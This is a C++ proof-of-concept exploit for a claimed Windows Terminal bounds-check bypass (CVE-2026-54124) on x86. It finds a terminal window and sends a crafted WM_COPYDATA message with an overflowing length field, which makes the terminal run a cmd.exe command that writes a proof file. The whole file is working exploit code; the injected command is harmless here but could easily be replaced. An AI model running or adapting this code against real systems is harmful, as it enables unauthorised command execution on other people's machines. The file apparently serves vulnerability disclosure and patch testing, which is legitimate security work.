#include <windows.h>

#include <cstdint>
#include <cstdio>
#include <cwchar>
#include <string>
#include <vector>

namespace
{
constexpr ULONG_PTR TerminalHandoffMagic = 0x4D524554; // "TERM" on x86
constexpr std::uint32_t OverflowBit = 0x80000000u;

HWND targetWindow{};

void appendUint32(std::vector<std::uint8_t>& output, std::uint32_t value)
{
    const auto bytes = reinterpret_cast<const std::uint8_t*>(&value);
    output.insert(output.end(), bytes, bytes + sizeof(value));
}

void appendWideBytes(std::vector<std::uint8_t>& output,
                     const wchar_t* value,
                     std::size_t characters)
{
    const auto bytes = reinterpret_cast<const std::uint8_t*>(value);
    output.insert(output.end(), bytes, bytes + characters * sizeof(wchar_t));
}

void appendString(std::vector<std::uint8_t>& output,
                  const std::wstring& value,
                  bool overflow)
{
    const auto characters = static_cast<std::uint32_t>(value.size() + 1);
    const auto declaredLength = overflow ? OverflowBit + characters : characters;
    appendUint32(output, declaredLength);
    appendWideBytes(output, value.c_str(), characters);
}

bool isWindowsTerminalProcess(DWORD processId, wchar_t* imagePath, DWORD imagePathCount)
{
    const auto process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
    if (!process)
    {
        return false;
    }

    DWORD length = imagePathCount;
    const auto queried = QueryFullProcessImageNameW(process, 0, imagePath, &length);
    CloseHandle(process);
    if (!queried)
    {
        return false;
    }

    const auto fileName = std::wcsrchr(imagePath, L'\\');
    return fileName && _wcsicmp(fileName + 1, L"WindowsTerminal.exe") == 0;
}

BOOL CALLBACK findTerminalWindow(HWND window, LPARAM)
{
    wchar_t className[256]{};
    if (!GetClassNameW(window, className, ARRAYSIZE(className)))
    {
        return TRUE;
    }

    constexpr wchar_t classPrefix[] = L"Windows Terminal";
    if (std::wcsncmp(className, classPrefix, ARRAYSIZE(classPrefix) - 1) != 0)
    {
        return TRUE;
    }

    DWORD processId{};
    GetWindowThreadProcessId(window, &processId);

    wchar_t imagePath[MAX_PATH]{};
    if (!processId || !isWindowsTerminalProcess(processId, imagePath, ARRAYSIZE(imagePath)))
    {
        return TRUE;
    }

    targetWindow = window;
    std::wprintf(L"[+] target hwnd=%p pid=%lu\n", window, processId);
    std::wprintf(L"[+] image: %ls\n", imagePath);
    std::wprintf(L"[+] class: %ls\n", className);
    return FALSE;
}

bool waitForFile(const wchar_t* path, DWORD timeoutMilliseconds)
{
    const auto deadline = GetTickCount64() + timeoutMilliseconds;
    do
    {
        if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES)
        {
            return true;
        }
        Sleep(100);
    } while (GetTickCount64() < deadline);

    return false;
}
}

int wmain(int argc, wchar_t** argv)
{
    static_assert(sizeof(std::size_t) == 4, "This PoC must be compiled for x86.");

    const bool normalControl = argc == 2 && _wcsicmp(argv[1], L"--normal-control") == 0;
    if (argc > 2 || (argc == 2 && !normalControl))
    {
        std::fwprintf(stderr, L"usage: %ls [--normal-control]\n", argv[0]);
        return 1;
    }

    const bool overflow = !normalControl;
    const wchar_t* proofPath = overflow ?
        L"C:\\CVE-2026-54124\\overflow-proof.txt" :
        L"C:\\CVE-2026-54124\\normal-proof.txt";

    const std::wstring command =
        std::wstring{ L"wt.exe new-tab C:\\Windows\\System32\\cmd.exe /d /c \"echo CVE-2026-54124>" } +
        proofPath + L"\"";

    const auto characters = static_cast<std::uint32_t>(command.size() + 1);
    const auto declaredLength = overflow ? OverflowBit + characters : characters;
    const auto wrappedBytes = static_cast<std::uint32_t>(declaredLength * sizeof(wchar_t));

    std::printf("CVE-2026-54124 Windows Terminal bounds-check bypass PoC\n");
    std::printf("[*] sizeof(size_t) = %zu\n", sizeof(std::size_t));
    std::printf("[*] mode = %s\n", overflow ? "overflow" : "normal control");
    std::printf("[*] declared length = 0x%08X\n", declaredLength);
    std::printf("[*] actual characters = %u\n", characters);
    std::printf("[*] x86 multiplication result = %u bytes\n", wrappedBytes);
    std::wprintf(L"[*] proof file = %ls\n", proofPath);

    DeleteFileW(proofPath);

    EnumWindows(findTerminalWindow, 0);
    if (!targetWindow)
    {
        std::fprintf(stderr, "[-] An x86 Windows Terminal handoff window was not found.\n");
        return 1;
    }

    std::vector<std::uint8_t> payload;
    appendString(payload, command, overflow);
    appendString(payload, L"X=Y", false);
    appendString(payload, L"C:\\", false);
    appendUint32(payload, SW_SHOWNORMAL);

    COPYDATASTRUCT copyData{};
    copyData.dwData = TerminalHandoffMagic;
    copyData.cbData = static_cast<DWORD>(payload.size());
    copyData.lpData = payload.data();

    std::printf("[*] payload size = %zu bytes\n", payload.size());
    std::printf("[*] sending crafted WM_COPYDATA...\n");

    DWORD_PTR messageResult{};
    SetLastError(ERROR_SUCCESS);
    const auto sent = SendMessageTimeoutW(targetWindow,
                                          WM_COPYDATA,
                                          0,
                                          reinterpret_cast<LPARAM>(&copyData),
                                          SMTO_ABORTIFHUNG | SMTO_ERRORONEXIT,
                                          5000,
                                          &messageResult);
    const auto sendError = GetLastError();

    std::printf("[*] send=%llu result=%llu gle=%lu\n",
                static_cast<unsigned long long>(sent),
                static_cast<unsigned long long>(messageResult),
                sendError);

    const auto reachedDispatch = waitForFile(proofPath, 5000);
    if (reachedDispatch)
    {
        std::printf("[+] command dispatch reached: proof file created.\n");
        std::printf("[*] This demonstrates parser reachability, not memory corruption.\n");
        return 0;
    }

    std::printf("[-] command dispatch not reached: proof file was not created.\n");
    std::printf("[*] This is expected for a patched target in overflow mode.\n");
    return 2;
}
